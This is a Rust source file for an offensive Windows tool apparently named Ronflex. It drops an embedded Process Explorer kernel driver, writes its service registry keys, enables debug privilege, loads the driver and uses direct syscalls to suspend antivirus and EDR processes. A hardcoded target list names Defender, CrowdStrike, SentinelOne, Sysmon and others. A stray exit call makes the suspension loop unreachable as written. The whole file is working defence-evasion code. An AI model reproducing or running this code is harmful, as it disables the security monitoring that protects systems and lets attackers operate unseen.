use colored::Colorize;
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntioapi::NtLoadDriver;
use rust_syscalls::syscall;
use winapi::shared::minwindef::DWORD;
use winapi::shared::minwindef::FALSE;
use winapi::shared::ntdef::UNICODE_STRING;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winnt::TOKEN_ELEVATION;
use winapi::um::winnt::TOKEN_QUERY;
use winapi::um::winnt::TokenElevation;
use std::env;
use std::fs;
use std::include_bytes;
use std::mem::size_of;
use std::path::Path;
use std::path::PathBuf;
use std::process::exit;
use std::ptr::null_mut;
use sysinfo::PidExt;
use sysinfo::ProcessExt;
use sysinfo::SystemExt;
use winapi::shared::ntdef::PHANDLE;
use winapi::shared::ntdef::PUNICODE_STRING;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::processthreadsapi::OpenProcessToken;
use winapi::um::securitybaseapi::AdjustTokenPrivileges;
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::winbase::LookupPrivilegeValueW;
use winapi::um::winnt::TokenPrivileges;
use winapi::um::winnt::PROCESS_SUSPEND_RESUME;
use winapi::um::winnt::SE_PRIVILEGE_ENABLED;
use winapi::um::winnt::TOKEN_ADJUST_PRIVILEGES;
use winapi::um::winnt::TOKEN_PRIVILEGES;
use winreg::enums::*;
use winreg::RegKey;

const SE_DEBUG_NAME: [u16 ; 17] = [83u16, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
const DRIVERNAME: &str = "ProcExp64";

pub fn create_unicode_string(s: &[u16]) -> UNICODE_STRING {
    // source: https://not-matthias.github.io/posts/kernel-driver-with-rust/
    let len = s.len();

    let n = if len > 0 && s[len - 1] == 0 { len - 1 } else { len };

    UNICODE_STRING {
        Length: (n * 2) as u16,
        MaximumLength: (len * 2) as u16,
        Buffer: s.as_ptr() as _,
    }
}

fn load_driver(drivername: String) -> bool {

    let mut p_drivername: UNICODE_STRING = create_unicode_string(obfstr::wide!("ProcExp64\0"));
    //println!("{:#?}", p_drivername);

    unsafe {
        //let ntstatus = syscall!("NtLoadDriver", p_drivername);
        let ntstatus = NtLoadDriver(&mut p_drivername);
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtLoadDriver");
                println!("{}", message);
            }
            _ => {
                let message = format!("[-] NtLoadDriver call failed.. NTSTATUS: {}", ntstatus);
                println!("{}", message);
                return false;
            }
        }
    }
    return true;
}

pub fn is_elevated() -> bool {
    // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
    let mut htoken: HANDLE = null_mut();
    let mut token_elevate: TOKEN_ELEVATION = TOKEN_ELEVATION { TokenIsElevated: 0 };
    let mut size: u32 = 0u32;
    unsafe {
        OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut htoken);
        GetTokenInformation(
            htoken,
            TokenElevation,
            &mut token_elevate as *const _ as *mut _,
            std::mem::size_of::<TOKEN_ELEVATION>() as u32,
            &mut size,
        );
        return token_elevate.TokenIsElevated == 1;
    }
}

fn enable_privilege() -> bool {
    // source: https://github.com/rayiik/mimiRust/blob/main/src/utilities/mod.rs
    unsafe {
        let mut htoken = null_mut();
        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();

        privilege.PrivilegeCount = 1;
        privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let ntstatus = LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME.as_ptr(), &mut privilege.Privileges[0].Luid);
        match ntstatus {
            FALSE => {
                let message = format!("[-] LookupPrivilegeValueW call failed.. NTSTATUS: {}", ntstatus);
                println!("{}", message);
                println!("{}", GetLastError());
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!("[+] Successfully used LookupPrivilegeValueW");
                println!("{}", message);
            }
        }

        let ntstatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut htoken);
        match ntstatus {
            FALSE => {
                let message = format!("[-] OpenProcessToken call failed.. NTSTATUS: {}", ntstatus);
                println!("{}", message);
                println!("{}", GetLastError());
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!("[+] Successfully used OpenProcessToken");
                println!("{}", message);
            }

        }
        /*
        let ntstatus = NtOpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            htoken
        );
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtOpenProcessToken");
                println!("{}", message);
            }
            _ => {
                let message = format!(
                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }

        let ntstatus = syscall!(
            "NtOpenProcessToken",
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES,
            htoken
        );
        match ntstatus {
            0 => {
                let message = format!("[+] Successfully used NtOpenProcessToken");
                println!("{}", message);
            }
            _ => {
                let message = format!(
                    "[-] NtOpenProcessToken call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
            }
        }
        */

        let ntstatus = AdjustTokenPrivileges(
            htoken as HANDLE,
            0,
            &mut privilege,
            std::mem::size_of_val(&privilege) as u32,
            null_mut(),
            null_mut(),
        );

        match ntstatus {
            0 => {
                let message = format!(
                    "[-] AdjustTokenPrivileges call failed.. NTSTATUS: {}",
                    ntstatus
                );
                println!("{}", message);
                let _ = syscall!("NtClose", htoken);
                return false;
            }
            _ => {
                let message = format!("[+] Successfully used AdjustTokenPrivileges");
                println!("{}", message);
            }

        }
        /*
        let mut token_privileges: *mut TOKEN_PRIVILEGES = std::ptr::null_mut();
        let mut token_privileges_length = 0u32;
        let mut token_privileges_vec = vec![0u8; token_privileges_length as usize];
        let _ = GetTokenInformation(
            htoken as HANDLE,
            TokenPrivileges,
            token_privileges as *mut std::ffi::c_void,
            token_privileges_length,
            &mut token_privileges_length as *mut u32,
        );
        println!("{:?}", token_privileges_vec);
        let _ = syscall!("NtClose", htoken);
        */
        let _ = syscall!("NtClose", htoken);
    }
    
    return true;
}

fn create_registry_key(
    drivername: String,
    driverpath: PathBuf,
) -> Result<(), Box<dyn std::error::Error>> {
    //let reg_path = format!("\\SYSTEM\\CurrentControlSet\\Services{}", servicename);
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SYSTEM")
        .join("CurrentControlSet")
        .join("Services")
        .join(&drivername);

    let (key1, _) = hkcu.create_subkey(&path)?;
    let value: u32 = 0;
    key1.set_value("Type", &value)?;

    let (key2, _) = hkcu.create_subkey(&path)?;
    key2.set_value("ErrorControl", &value)?;

    let (key3, _) = hkcu.create_subkey(&path)?;
    key3.set_value("Start", &value)?;

    let driverpath = driverpath.to_str().unwrap();
    let (key4, _) = hkcu.create_subkey(&path)?;
    key4.set_value("ImagePath", &driverpath)?;
    /*
        let sz_val: String = key.get_value("TestSZ")?;
        key.delete_value("TestSZ")?;
        println!("TestSZ = {}", sz_val);
    */
    Ok(())
}

fn write_driver() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let driver = include_bytes!("../resources/PROCEXP.sys");
    fs::write("PROCEXP", driver)?;
    let path = fs::canonicalize(Path::new(r".\PROCEXP"))?;

    Ok(path)
}

fn evil(target: &str) {
    let system = sysinfo::System::new_all();

    for p in system.processes_by_exact_name(target) {
        println!("Targeting process: {} with PID: {}", p.name(), p.pid());
        let pid: u32 = p.pid().as_u32();

        let cid: CLIENT_ID = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: 0 as _,
        };

        let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
            RootDirectory: NULL,
            ObjectName: NULL as _,
            Attributes: 0,
            SecurityDescriptor: NULL,
            SecurityQualityOfService: NULL,
        };

        let mut handle: HANDLE = NULL;
        let mut ntstatus: NTSTATUS;

        unsafe {
            ntstatus = syscall!(
                "NtOpenProcess",
                &mut handle,
                PROCESS_SUSPEND_RESUME,
                &oa,
                &cid
            );

            match ntstatus {
                0 => {}
                _ => {
                    let message = format!(
                        "[-] Error accessing process: {} with PID: {}. NTSTATUS: {}. Skipping..",
                        p.name(),
                        p.pid(),
                        ntstatus
                    )
                    .red();
                    println!("{}", message);
                    continue;
                }
            };

            ntstatus = syscall!("NtSuspendProcess", handle);

            match ntstatus {
                0 => {
                    let message = format!("[+] Ronflex worked! Have a good night {}", &pid).green();
                    println!("{}", message);
                }
                _ => {
                    let message = format!("[-] Ronflex failed.. NTSTATUS: {}", ntstatus).red();
                    println!("{}", message);
                }
            }

            let _ = syscall!("NtClose", handle);
        }
    }
}

fn main() {
    // product list source https://github.com/BishopFox/sliver/blob/041ae65c61629e65646623e472d658472022d84e/client/command/processes/ps.go
    let product_list: Vec<&str> = vec![
        "ccSvcHst.exe",
        "cb.exe",
        "RepMgr.exe",
        "RepUtils.exe",
        "RepUx.exe",
        "RepWSC.exe",
        "scanhost.exe",
        "MsMpEng.exe",
        "SenseIR.exe",
        "SenseCncProxy.exe",
        "MsSense.exe",
        "MpCmdRun.exe",
        "MonitoringHost.exe",
        "HealthService.exe",
        "smartscreen.exe",
        "CSFalconService.exe",
        "CSFalconContainer.exe",
        "bdservicehost.exe",
        "bdagent.exe",
        "bdredline.exe",
        "coreServiceShell.exe",
        "ds_monitor.exe",
        "Notifier.exe",
        "dsa.exe",
        "ds_nuagent.exe",
        "coreFrameworkHost.exe",
        "SentinelServiceHost.exe",
        "SentinelStaticEngine.exe",
        "SentinelStaticEngineScanner.exe",
        "SentinelAgent.exe",
        "SentinelAgentWorker.exe",
        "SentinelHelperService.exe",
        "SentinelBrowserNativeHost.exe",
        "SentinelUI.exe",
        "Sysmon.exe",
        "Sysmon64.exe",
        "CylanceSvc.exe",
        "CylanceUI.exe",
        "TaniumClient.exe",
        "TaniumCX.exe",
        "TaniumDetectEngine.exe",
    ];
    //let drivername = "ProcExp64";

    let args: Vec<String> = env::args().collect();

    println!("Run this tool as SYSTEM for maximum effect");

    let is_elevated = is_elevated();
    match is_elevated {
        true => {
            println!("[+] You have elevated rights, let's start..");
        }
        false => {
            panic!("[-] You don't have elevated rights. Aborting..");
        }
    }

    let is_driver_written = write_driver();
    let driverpath = match is_driver_written {
        Ok(path) => {
            println!(
                "[+] Successfully wrote ProcExp driver on disk. Path {:?}",
                path
            );
            path
        }
        Err(e) => panic!("[-] Error while dropping ProcExp driver on disk: {}", e),
    };

    let res_create_reg = create_registry_key(DRIVERNAME.to_string(), driverpath);
    match res_create_reg {
        Ok(()) => println!("[+] Successfully wrote {} registry keys", DRIVERNAME),
        Err(e) => panic!("[-] Error while writting {} registry keys: {}", DRIVERNAME, e),
    }

    let res_enable_priv = enable_privilege();
    match res_enable_priv {
        true => {
            println!("[+] Successfully got SE_DEBUG privileges !");
        }
        false => {
            panic!("[-] Error while getting SE_DEBUG privileges");
        }
    }

    let res_load_driver = load_driver(DRIVERNAME.to_string());
    match res_load_driver {
        true => {
            println!("[+] Successfully loaded {} driver !", DRIVERNAME);
        }
        false => {
            panic!("[-] Error while loading {} driver", DRIVERNAME);
        }
    }
    exit(0);

    if args.len() == 2 {
        println!(
            "[+] Executing tool in custom target mode. Targeting {} process",
            &args[1]
        );
        let target = &args[1];
        evil(target);
    } else {
        println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
        for target in product_list {
            evil(target);
        }
    }
}
